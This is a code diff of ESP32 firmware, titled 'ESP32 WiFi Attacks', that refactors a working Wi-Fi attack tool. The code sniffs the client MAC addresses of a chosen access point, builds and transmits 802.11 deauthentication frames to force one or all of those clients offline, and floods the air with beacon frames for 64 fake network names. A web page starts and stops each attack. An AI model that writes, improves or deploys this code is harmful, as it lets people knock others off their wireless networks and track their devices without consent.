@@ -14,49 +14,48 @@ void begin_attack(int net_index, int mode, uint16_t reason_code);
 void end_attack();
 
 // ================= 802.11 CONSTANTS =================
-#define TO_DS   0x01
-#define FROM_DS 0x02
+#define TO_DS           0x01
+#define FROM_DS         0x02
 #define MIN_PAYLOAD_LEN 26
-#define MIN_RSSI -80
-#define MAX_CLIENTS 50
+#define MIN_RSSI        -80
+#define MAX_CLIENTS     50
 
 // ================= CLIENT STORAGE =================
-#define MAX_CLIENTS 50
 uint8_t discovered_clients[MAX_CLIENTS][6];
 volatile int client_count = 0;
 
 // ================= TARGET INFO =================
 uint8_t target_bssid[6];
-String target_ssid_name = "Unknown";
+String  target_ssid_name = "Unknown";
 uint8_t my_ap_mac[6];
 
 // ================= SNIFF STATE =================
-bool is_sniffing = false;
-unsigned long sniff_start_time = 0;
+bool          is_sniffing        = false;
+unsigned long sniff_start_time   = 0;
 const unsigned long SNIFF_DURATION = 30000;
 
-bool pending_sniff = false;
+bool          pending_sniff      = false;
 unsigned long pending_sniff_time = 0;
-int pending_ch = 1;
+int           pending_ch         = 1;
 
 // ================= ATTACK STATE =================
-bool attack_running = false;
-bool attack_all = false;
-bool attack_initialized = false;
+bool    attack_running     = false;
+bool    attack_all         = false;
+bool    attack_initialized = false;
 uint8_t target_client[6];
 
-// ================= STRUCT (DEAUTH) =================
+// ================= DEAUTH FRAME STRUCT =================
 typedef struct {
-  uint8_t frame_control[2] = { 0xC0, 0x00 };
-  uint8_t duration[2];
-  uint8_t station[6];
-  uint8_t sender[6];
-  uint8_t access_point[6];
-  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
+  uint8_t  frame_control[2]      = { 0xC0, 0x00 };
+  uint8_t  duration[2];
+  uint8_t  station[6];
+  uint8_t  sender[6];
+  uint8_t  access_point[6];
+  uint8_t  fragment_sequence[2]  = { 0xF0, 0xFF };
   uint16_t reason;
 } deauth_frame_t;
 
-// ================= NEW BEACON SPAM CONFIG =================
+// ================= BEACON SPAM CONFIG =================
 const char ssids[] PROGMEM =
   "Mom Use This One\n"
   "Abraham Linksys\n"
@@ -124,28 +123,27 @@ const char ssids[] PROGMEM =
   "Optimus Prime Network\n";
 
 #define NUM_SSIDS 64
-static int beacon_ssids_total_len = 0;
-static int beacon_ssid_offsets[NUM_SSIDS];
+static int     beacon_ssids_total_len         = 0;
+static int     beacon_ssid_offsets[NUM_SSIDS];
 static uint8_t beacon_ssid_lengths[NUM_SSIDS];
 static uint8_t beacon_ssid_macs[NUM_SSIDS][6];
-static uint8_t beacon_ssid_actual_count = 0;
-static bool beacon_macs_initialized = false;
+static uint8_t beacon_ssid_actual_count       = 0;
+static bool    beacon_macs_initialized        = false;
 
-const bool beacon_wpa2 = false;
-const uint8_t BEACON_BATCH_SIZE = 5;
+const bool          beacon_wpa2           = false;
+const uint8_t       BEACON_BATCH_SIZE     = 5;
 const unsigned long BEACON_TX_INTERVAL_MS = 120;
 
-bool is_beaconing = false;
-unsigned long beacon_attack_time = 0;
-uint8_t beacon_wifi_channel = 1;
-char beacon_empty_ssid[32];
-uint16_t beacon_packet_size = 0;
-uint8_t beacon_current_ssid_index = 0;
+bool          is_beaconing              = false;
+unsigned long beacon_attack_time        = 0;
+uint8_t       beacon_wifi_channel       = 1;
+char          beacon_empty_ssid[32];
+uint16_t      beacon_packet_size        = 0;
+uint8_t       beacon_current_ssid_index = 0;
 
-// Working Beacon Packet Template (109 bytes)
 uint8_t beaconPacket[109] = {
-  /* 0 - 3  */ 0x80, 0x00, 0x00, 0x00,
-  /* 4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  /*  0 -  3 */ 0x80, 0x00, 0x00, 0x00,
+  /*  4 -  9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
   /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
   /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
   /* 22 - 23 */ 0x00, 0x00,
@@ -171,7 +169,7 @@ uint8_t beaconPacket[109] = {
   /*107 -108 */ 0x00, 0x00
 };
 
-// --- BEACON INIT FUNCTION ---
+// ================= BEACON INIT =================
 void beacon_init_ssid_table() {
   beacon_ssid_actual_count = 0;
   int offset = 0;
@@ -237,25 +235,24 @@ void processPacket(const uint8_t *payload, uint16_t len, int8_t rssi) {
 
   if (macEqual(addr1, my_ap_mac) || macEqual(addr2, my_ap_mac) || macEqual(addr3, my_ap_mac)) return;
 
-  uint8_t fc1 = payload[1];
-  bool to_ds = fc1 & TO_DS;
-  bool from_ds = fc1 & FROM_DS;
+  uint8_t fc1    = payload[1];
+  bool to_ds     = fc1 & TO_DS;
+  bool from_ds   = fc1 & FROM_DS;
 
   uint8_t *client = nullptr;
-  uint8_t *ap = nullptr;
+  uint8_t *ap     = nullptr;
 
-  if (to_ds && !from_ds) { client = addr2; ap = addr1; }
-  else if (!to_ds && from_ds) { client = addr1; ap = addr2; }
+  if      ( to_ds && !from_ds) { client = addr2; ap = addr1; }
+  else if (!to_ds &&  from_ds) { client = addr1; ap = addr2; }
   else if (!to_ds && !from_ds) { client = addr2; ap = addr3; }
   else return;
 
-  if (!macEqual(ap, target_bssid)) return;
-  if (macEqual(client, target_bssid)) return;
-  if (client[0] & 0x01) return;
+  if (!macEqual(ap, target_bssid))     return;
+  if ( macEqual(client, target_bssid)) return;
+  if (client[0] & 0x01)                return;
 
-  for (int i = 0; i < client_count; i++) {
+  for (int i = 0; i < client_count; i++)
     if (macEqual(client, discovered_clients[i])) return;
-  }
 
   if (client_count < MAX_CLIENTS) {
     memcpy(discovered_clients[client_count], client, 6);
@@ -265,7 +262,6 @@ void processPacket(const uint8_t *payload, uint16_t len, int8_t rssi) {
 
 void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (!is_sniffing || type != WIFI_PKT_DATA) return;
-
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
   processPacket(pkt->payload, pkt->rx_ctrl.sig_len, pkt->rx_ctrl.rssi);
 }
@@ -276,7 +272,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <html>
 <head>
 <meta charset="UTF-8">
-<title>ESP32 Tactical</title>
+<title>ESP32 WiFi Attacks</title>
 <style>
 body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
 h1 { color:#58a6ff; }
@@ -289,7 +285,7 @@ th,td { border:1px solid #30363d; padding:10px; }
 </head>
 <body>
 
-<h1>ESP32 Tactical</h1>
+<h1>ESP32 WiFi Attacks</h1>
 
 <button onclick="scan()">Scan Networks</button>
 <button onclick="toggleBeacon()" id="beaconBtn" style="background:#d29922;">Start Beacon Spam</button>
@@ -333,7 +329,7 @@ function scan() {
 function startSniff(mac, ch, ssid) {
   document.getElementById('targetPanel').style.display = 'block';
   document.getElementById('targetTitle').innerText = 'Target AP: ' + ssid;
-  document.getElementById('clientList').innerHTML = 'Sniffing... reconnect to ESP32_Tactical after ~20 seconds.';
+  document.getElementById('clientList').innerHTML = 'Sniffing... reconnect to ESP32 after ~20 seconds.';
   fetch(`/start_sniff?mac=${mac}&ch=${ch}&ssid=${encodeURIComponent(ssid)}`);
   setTimeout(fetchClients, 20000);
 }
@@ -383,6 +379,8 @@ function toggleBeacon() {
     beaconing = data.active;
     document.getElementById('beaconBtn').innerText =
       beaconing ? 'Stop Beacon Spam' : 'Start Beacon Spam';
+    document.getElementById('beaconBtn').style.background =
+      beaconing ? '#da3633' : '#d29922';
   });
 }
 </script>
@@ -396,14 +394,12 @@ void setup() {
   Serial.begin(115200);
 
   WiFi.mode(WIFI_AP_STA);
-
   WiFi.setSleep(false);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
-  WiFi.softAP("ESP32_Tactical", "mgmtadmin");
+  WiFi.softAP("ESP32", "kludge2526");
   esp_read_mac(my_ap_mac, ESP_MAC_WIFI_SOFTAP);
 
-  // Initialize Working Beacon Config
   beacon_ssids_total_len = strlen_P(ssids);
   beacon_init_ssid_table();
   memset(beacon_empty_ssid, 0x20, 32);
@@ -415,60 +411,68 @@ void setup() {
   }
 
   // --- ROUTES ---
-  server.on("/", []() { server.send(200, "text/html", index_html); });
+  server.on("/", []() {
+    server.send(200, "text/html", index_html);
+  });
 
   server.on("/scan", [](){
-    int n=WiFi.scanNetworks();
-    String json="[";
-    for(int i=0;i<n;i++){
-      if(i) json+=",";
-      json+="{\"ssid\":\""+WiFi.SSID(i)+"\",\"mac\":\""+WiFi.BSSIDstr(i)+"\",\"ch\":"+String(WiFi.channel(i))+",\"rssi\":"+String(WiFi.RSSI(i))+"}";
+    int n = WiFi.scanNetworks();
+    String json = "[";
+    for (int i = 0; i < n; i++) {
+      if (i) json += ",";
+      json += "{\"ssid\":\"" + WiFi.SSID(i) +
+              "\",\"mac\":\""  + WiFi.BSSIDstr(i) +
+              "\",\"ch\":"     + String(WiFi.channel(i)) +
+              ",\"rssi\":"     + String(WiFi.RSSI(i)) + "}";
     }
-    json+="]";
-    server.send(200,"application/json",json);
+    json += "]";
+    server.send(200, "application/json", json);
   });
 
   server.on("/start_sniff", [](){
     parseBytes(server.arg("mac").c_str(), ':', target_bssid, 6, 16);
-    pending_ch=server.arg("ch").toInt();
-    target_ssid_name=server.arg("ssid");
-    pending_sniff=true;
-    pending_sniff_time=millis();
-    server.send(200,"text/plain","OK");
+    pending_ch       = server.arg("ch").toInt();
+    target_ssid_name = server.arg("ssid");
+    pending_sniff    = true;
+    pending_sniff_time = millis();
+    server.send(200, "text/plain", "OK");
   });
 
   server.on("/get_clients", [](){
-    String json="{\"clients\":[";
-    for(int i=0;i<client_count;i++){
-      if(i) json+=",";
-      json+="\""+macToString(discovered_clients[i])+"\"";
+    String json = "{\"clients\":[";
+    for (int i = 0; i < client_count; i++) {
+      if (i) json += ",";
+      json += "\"" + macToString(discovered_clients[i]) + "\"";
     }
-    json+="]}";
-    server.send(200,"application/json",json);
+    json += "]}";
+    server.send(200, "application/json", json);
   });
 
   server.on("/deauth_client", [](){
     parseBytes(server.arg("mac").c_str(), ':', target_client, 6, 16);
-    attack_running=true;
-    attack_all=false;
-    attack_initialized=false;
-    server.send(200,"text/plain","STARTED");
+    attack_running     = true;
+    attack_all         = false;   // single target
+    attack_initialized = false;
+    server.send(200, "text/plain", "STARTED");
   });
 
   server.on("/deauth_all", [](){
-    attack_running=true;
-    attack_all=true;
-    attack_initialized=false;
-    server.send(200,"text/plain","STARTED");
+    attack_running     = true;
+    attack_all         = true;    // all clients
+    attack_initialized = false;
+    server.send(200, "text/plain", "STARTED");
   });
 
+  // FIX: only call end_attack() when DEAUTH_ALL was active (it's the only
+  // mode that installed a promiscuous callback via begin_attack).
+  // Single-client mode never touched the sniffer, so calling end_attack()
+  // there would unnecessarily tear down the radio and restart the AP.
   server.on("/stop_deauth", [](){
-    attack_running = false;
+    attack_running     = false;
     attack_initialized = false;
-    is_sniffing = false;
-
-    end_attack();
-
+    is_sniffing        = false;
+    if (attack_all) end_attack();  // only clean up sniffer when it was started
+    attack_all         = false;
     server.send(200, "text/plain", "STOPPED");
   });
 
@@ -476,18 +480,20 @@ void setup() {
     is_beaconing = !is_beaconing;
 
     if (is_beaconing) {
-      attack_running = false;
-      attack_initialized = false;
-      end_attack(); // Stops any ongoing deauths cleanly without kicking you
-      
+      // Stop any running attack cleanly before switching to beacon mode
+      if (attack_running) {
+        attack_running     = false;
+        attack_initialized = false;
+        if (attack_all) end_attack();
+        attack_all = false;
+      }
       if (is_sniffing) {
         is_sniffing = false;
         esp_wifi_set_promiscuous(false);
       }
-      
-      beacon_attack_time = millis();
+      beacon_attack_time        = millis();
       beacon_current_ssid_index = 0;
-      beacon_wifi_channel = WiFi.channel();
+      beacon_wifi_channel       = WiFi.channel();
       if (beacon_wifi_channel < 1 || beacon_wifi_channel > 14) beacon_wifi_channel = 1;
     }
 
@@ -502,64 +508,60 @@ void setup() {
 void loop() {
   server.handleClient();
 
-  // PENDING SNIFF
+  // ===== PENDING SNIFF =====
   if (pending_sniff && millis() - pending_sniff_time > 1000) {
     pending_sniff = false;
     esp_wifi_set_promiscuous(false);
-    WiFi.softAP("ESP32_Tactical","mgmtadmin",pending_ch); 
+    WiFi.softAP("ESP32", "kludge2526", pending_ch);
     esp_wifi_set_channel(pending_ch, WIFI_SECOND_CHAN_NONE);
     client_count = 0;
 
     wifi_promiscuous_filter_t filter = {
       .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
     };
-
     esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
     esp_wifi_set_promiscuous(true);
 
-    is_sniffing = true;
+    is_sniffing      = true;
     sniff_start_time = millis();
   }
 
-  // SNIFF TIMEOUT
-  if (is_sniffing && millis()-sniff_start_time>SNIFF_DURATION) {
-    is_sniffing=false;
+  // ===== SNIFF TIMEOUT =====
+  if (is_sniffing && millis() - sniff_start_time > SNIFF_DURATION) {
+    is_sniffing = false;
     esp_wifi_set_promiscuous(false);
   }
 
-  // ACTIVE DEAUTH - 100% untouched
+  // ===== DEAUTH =====
   if (attack_running) {
 
-  if (!attack_initialized) {
-    begin_attack(0, attack_all ? DEAUTH_ALL : DEAUTH_SINGLE, 0x0007);
-    attack_initialized = true;
+    if (!attack_initialized) {
+
+      if (attack_all) {
+        begin_attack(0, DEAUTH_ALL, 0x0007);
+      }
+      attack_initialized = true;
+    }
+
+    if (!attack_all) {
+      deauth_frame_t deauth_frame = {};
+      deauth_frame.reason = 0x0007;
+
+      memcpy(deauth_frame.station,      target_client, 6);
+      memcpy(deauth_frame.sender,       target_bssid,  6);
+      memcpy(deauth_frame.access_point, target_bssid,  6);
+
+      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+      delay(75);
+    }
   }
-
-  if (!attack_all) {
-
-    deauth_frame_t deauth_frame = {};
-    deauth_frame.reason = 0x0007;
-
-    memcpy(deauth_frame.station, target_client, 6);
-    memcpy(deauth_frame.sender, target_bssid, 6);
-    memcpy(deauth_frame.access_point, target_bssid, 6);
-
-    esp_wifi_80211_tx(
-      WIFI_IF_AP,
-      &deauth_frame,
-      sizeof(deauth_frame),
-      false
-    );
-
-    delay(75);
-  }}
 
   if (!attack_running) {
     attack_initialized = false;
   }
 
-  // MERGED WORKING BEACON SPAM
+  // ===== BEACON SPAM =====
   if (is_beaconing && beacon_macs_initialized && beacon_ssid_actual_count > 0) {
     unsigned long now = millis();
 
@@ -572,7 +574,7 @@ void loop() {
       for (uint8_t b = 0; b < BEACON_BATCH_SIZE; b++) {
         uint8_t idx = beacon_current_ssid_index;
 
-        char ssidBuf[33];
+        char    ssidBuf[33];
         uint8_t ssidLen = beacon_ssid_lengths[idx];
         for (uint8_t i = 0; i < ssidLen; i++)
           ssidBuf[i] = (char)pgm_read_byte(ssids + beacon_ssid_offsets[idx] + i);
